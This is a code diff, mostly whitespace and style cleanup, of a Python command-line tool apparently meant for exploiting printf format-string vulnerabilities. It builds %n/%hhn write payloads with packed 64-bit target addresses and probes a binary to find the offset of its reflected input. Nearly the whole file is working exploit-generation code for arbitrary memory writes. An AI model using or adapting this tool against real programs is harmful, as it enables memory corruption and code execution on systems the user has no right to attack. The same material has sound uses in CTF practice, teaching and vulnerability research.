@@ -1,9 +1,11 @@
 #!/bin/env python3
 import subprocess
-from pwn import *
+from pwn import p64
 import sys
 
 # Added code to help hexencode strings and bytes
+
+
 def hexify(inp_bytes):
     inp_bytes = inp_bytes[::-1]
     out = ""
@@ -17,13 +19,13 @@ def hexify(inp_bytes):
     return out
 
 
-
 def plain_print(inp):
     if type(inp) == str:
         inp = inp.encode()
         sys.stdout.buffer.write(inp)
     elif type(inp) == bytes:
         sys.stdout.buffer.write(inp)
+
 
 def sanitize_where(where):
     addr = []
@@ -32,8 +34,8 @@ def sanitize_where(where):
             addr.append(x)
         elif type(x) == str:
             try:
-                addr.append(int(x ,16))
-            except ValueError :
+                addr.append(int(x, 16))
+            except ValueError:
                 print("ERROR: Input Format Error")
                 exit()
         else:
@@ -41,8 +43,10 @@ def sanitize_where(where):
             exit()
     return addr
 
-# Helper function to interact with given binary 
+# Helper function to interact with given binary
 # using stdin, arguments & environment
+
+
 def tbin(binary, pld,  method="stdin"):
     if method == "stdin":
         res = subprocess.check_output(
@@ -67,6 +71,8 @@ def reflector(binary, attempts=100, method="stdin"):
     return out
 
 # Todo : remove
+
+
 def whr_pss(inp):
     HX = inp
     if type(inp) == str:
@@ -96,7 +102,7 @@ def cprinter(what):
         if what[x] < 10:
             what[x] = "A" * what[x]
         else:
-            what[x] = "%" + str( what[x] ) + "x"
+            what[x] = "%" + str(what[x]) + "x"
     return what
 
 
@@ -109,24 +115,24 @@ def writer(c2print, steps, param_offset):
     elif steps == 1:
         bytes2write = "hh"
 
-
     len_c2print = 0
     for x in c2print:
         len_c2print += len(x)
 
     expected_length = len_c2print + \
-            len(c2print) * (len(bytes2write) + 3 + len(str(param_offset)))
+        len(c2print) * (len(bytes2write) + 3 + len(str(param_offset)))
 
-    while True :
+    while True:
         padding = ""
         next_param = param_offset
         while(expected_length % 8 != 0):
             padding += "A"
-            expected_length +=1
+            expected_length += 1
 
         fmt = []
         for x in c2print:
-            fmt.append("%" + str(next_param + expected_length // 8) + "$" + bytes2write + "n")
+            fmt.append("%" + str(next_param + expected_length //
+                                 8) + "$" + bytes2write + "n")
             next_param += 1
 
         pld = ""
@@ -141,6 +147,8 @@ def writer(c2print, steps, param_offset):
 
 # takes care of size of given input and extra padding
 # to clear off exxess bytes (residue from previous value)
+
+
 def prep_bytes(what, steps):
     order = []
     final = []
@@ -156,16 +164,16 @@ def prep_bytes(what, steps):
             byte = int("0x" + hx[2 * x * steps: 2 * (x + 1) * steps], 16)
             split_byte.append(byte)
         split_bytes.append(split_byte)
-        final = sorted( final + split_byte )
+        final = sorted(final + split_byte)
 
     for x in final:
         for split_byte in split_bytes:
             if x in split_byte:
-                order.append((split_byte.index(x), split_bytes.index(split_byte)))
+                order.append(
+                    (split_byte.index(x), split_bytes.index(split_byte)))
                 split_byte[split_byte.index(x)] = "XX"
 
     return final, order
-
 
 
 def write(content,  param_offset, context="compact"):
@@ -180,12 +188,11 @@ def write(content,  param_offset, context="compact"):
             what[x] = hexify(what[x])
 
     if context == "safe":
-        steps= 1
-    elif  context=="risky" or int(max(what),16) < 0xffff:
+        steps = 1
+    elif context == "risky" or int(max(what), 16) < 0xffff:
         steps = 4       # 1, 2, 4
     else:
         steps = 2
-
 
     final, order = prep_bytes(what, steps)
 
@@ -193,7 +200,6 @@ def write(content,  param_offset, context="compact"):
 
     fmt = writer(final, steps, param_offset)
     fmt = fmt.encode()
-
 
     # print("order: " + str(order))
     # print(final)
@@ -215,7 +221,7 @@ def write(content,  param_offset, context="compact"):
         # print("addr[addr_index]: " + hex(addr[marker] + steps * (max_splits-x[0])))
         # print("-------\n")
 
-        fmt += p64(addr[marker] + steps * (max_splits  - x[0]))
+        fmt += p64(addr[marker] + steps * (max_splits - x[0]))
 
     return fmt
 
@@ -228,20 +234,24 @@ if __name__ == "__main__":
     parser.add_argument("-w", "--write", help="Write to some location")
     parser.add_argument("-v", "--value", help="What to write")
     parser.add_argument("-l", "--loc", help="Where to write")
-    parser.add_argument("-o", "--offset", help="Parameter offset for reflected input")
-    parser.add_argument("-c", "--context", help="safe means stable, compact means small")
+    parser.add_argument(
+        "-o", "--offset", help="Parameter offset for reflected input")
+    parser.add_argument("-c", "--context",
+                        help="safe means stable, compact means small")
 
     parser.add_argument("-b", "--binary", help="Location of binary")
-    parser.add_argument("-i", "--method", help="Method to interact with binary")
+    parser.add_argument(
+        "-i", "--method", help="Method to interact with binary")
     parser.add_argument("-a", "--attempts", help="Number of offsets to test")
-    parser.add_argument("-p", "--preinput", help="input required to reach printf")
+    parser.add_argument("-p", "--preinput",
+                        help="input required to reach printf")
 
     args = parser.parse_args()
 
     if args.write:
         what = args.value.split(",")
         where = args.loc.split(",")
-        content = dict( zip(where, what) )
+        content = dict(zip(where, what))
         if len(what) != len(where):
             print("Error: no of values do not match no of addresses")
             exit(2)
@@ -255,4 +265,3 @@ if __name__ == "__main__":
         else:
             attempts = 100
         print(reflector(args.binary, attempts, args.method))
-
